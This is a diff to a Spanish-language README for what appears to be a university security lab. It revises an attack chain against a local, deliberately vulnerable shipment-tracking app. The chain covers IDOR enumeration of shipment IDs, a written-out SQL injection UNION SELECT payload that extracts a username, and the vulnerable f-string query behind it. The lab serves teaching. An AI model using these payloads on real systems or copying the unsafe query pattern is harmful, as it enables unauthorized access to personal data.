@@ -9,12 +9,12 @@ UTN FRBA - Grupo 4 - 2026
 
 ```
 Paso 1 — A01: IDOR / BOLA          Portal de Seguimiento (5001)
-  GET /tracking?shipment_id=3847291
+  GET /tracking?shipment_id=692
   -> sin verificacion de ownership, devuelve datos del destinatario:
-     user_id=1, nombre, email de la victima (carlos.gomez@gmail.com)
+     nombre + ID de cliente ofuscado de la victima (204815). Sin email.
 
 Paso 2 — A05: SQL Injection         Portal de Seguimiento (5001)
-  GET /support/search?user_id=1 UNION SELECT id,username,first_name,last_name FROM users WHERE id=1--
+  GET /support/search?user_id=204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
   -> extrae el username de la victima: "carlos_gomez" (aparece en la columna Nombre)
   (requiere cookie SSO del portal de clientes)
 
@@ -148,22 +148,24 @@ Esto crea la cookie SSO `fk_session` que tambien es valida en el portal de segui
 
 El atacante recibio el link de su propio envio:
 ```
-http://localhost:5001/tracking?shipment_id=4829163
+http://localhost:5001/tracking?shipment_id=666
 ```
 
-Prueba otros IDs por fuerza bruta y encuentra el de la victima:
+Prueba otros IDs por fuerza bruta (barrido desde 666 hacia arriba) y encuentra el de la victima:
 ```
-http://localhost:5001/tracking?shipment_id=3847291
+http://localhost:5001/tracking?shipment_id=692
 ```
 
 **Resultado:** el servidor devuelve los datos de Carlos Gomez sin verificar ownership.
 
-| Campo         | Valor obtenido         |
-|---------------|------------------------|
-| Nombre        | Carlos Gomez           |
-| Email         | carlos.gomez@gmail.com |
-| ID de cliente | `1`                    |
-| Orden         | ORD-2026-1001          |
+| Campo         | Valor obtenido    |
+|---------------|-------------------|
+| Nombre        | Carlos Gomez      |
+| ID de cliente | `204815`          |
+| Orden         | ORD-2026-1001     |
+
+> El detalle del envio **no expone el email** del cliente — solo el ID de cliente
+> (ofuscado, no enumerable). Ese ID es el dato que habilita el Paso 2.
 
 **Por que funciona:** el endpoint valida el token SSO pero no compara el `user_id` del envio
 con el `user_id` de la sesion activa. Solo busca en la DB por `shipment_id`.
@@ -172,29 +174,29 @@ con el `user_id` de la sesion activa. Solo busca en la DB por `shipment_id`.
 
 ### Paso 2 — SQL Injection: extraer el username
 
-Con el `ID de cliente: 1` obtenido en el paso anterior, el atacante va al buscador interno de soporte:
+Con el `ID de cliente: 204815` obtenido en el paso anterior, el atacante va al buscador interno de soporte:
 
 Consulta normal:
 ```
-http://localhost:5001/support/search?user_id=1
+http://localhost:5001/support/search?user_id=204815
 ```
-Devuelve: ID=1, Nombre=Carlos, Apellido=Gomez, Email=carlos.gomez@gmail.com
+Devuelve: ID=204815, Nombre=Carlos, Apellido=Gomez (sin email ni username)
 
 Ahora inyecta en el parametro `user_id`:
 ```
-1 UNION SELECT id,username,first_name,last_name FROM users WHERE id=1--
+204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
 ```
 
 URL completa:
 ```
-http://localhost:5001/support/search?user_id=1 UNION SELECT id,username,first_name,last_name FROM users WHERE id=1--
+http://localhost:5001/support/search?user_id=204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
 ```
 
 **Resultado:** aparece una segunda fila con `carlos_gomez` en la columna **Nombre**.
 
 **Por que funciona:** el backend concatena el parametro directamente en la query:
 ```python
-query = f"SELECT u.id, u.first_name, u.last_name, u.email FROM users WHERE u.id = {user_id}"
+query = f"SELECT u.id, u.first_name, u.last_name FROM users WHERE u.id = {user_id}"
 ```
 El `UNION SELECT` se ejecuta como SQL valido. No hay passwords en esta tabla,
 la inyeccion solo expone el username — suficiente para el paso siguiente.
@@ -263,12 +265,12 @@ payload = json.loads(base64.urlsafe_b64decode(token))  # sin HMAC check
 
 ### Portal de Seguimiento (tracking.db)
 
-| Usuario        | Email                    | user_id | shipment_id | Rol      |
-|----------------|--------------------------|---------|-------------|----------|
-| `carlos_gomez` | carlos.gomez@gmail.com   | 1       | 3847291     | Victima  |
-| `ana_martinez` | ana.martinez@hotmail.com | 2       | 7281053     | —        |
-| `lucia_perez`  | lucia.perez@yahoo.com    | 3       | 3562748     | —        |
-| `attacker`     | attacker@mailinator.com  | 4       | 4829163     | Atacante |
+| Usuario        | Email                    | ID de cliente | shipment_id | Rol      |
+|----------------|--------------------------|---------------|-------------|----------|
+| `carlos_gomez` | carlos.gomez@gmail.com   | 204815        | 692         | Victima  |
+| `ana_martinez` | ana.martinez@hotmail.com | 119273        | 759         | —        |
+| `lucia_perez`  | lucia.perez@yahoo.com    | 387640        | 481         | —        |
+| `attacker`     | attacker@mailinator.com  | 256108        | 666         | Atacante |
 
 ---
 
